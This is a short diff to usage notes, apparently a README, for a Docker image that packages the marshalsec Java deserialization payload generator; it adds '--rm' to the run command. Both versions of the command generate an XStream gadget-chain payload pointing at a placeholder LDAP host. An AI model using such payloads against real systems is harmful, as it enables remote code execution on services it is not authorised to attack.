@@ -8,7 +8,7 @@ https://github.com/mbechler/marshalsec
 
 usage:
 ```
-docker run -ti ssst0n3/sectools:marshalsec marshalsec.XStream CommonsBeanutils ldap://<IP>:<PORT>/exp > payload.xml
+docker run -ti --rm ssst0n3/sectools:marshalsec marshalsec.XStream CommonsBeanutils ldap://<IP>:<PORT>/exp > payload.xml
 ```
 
 same as
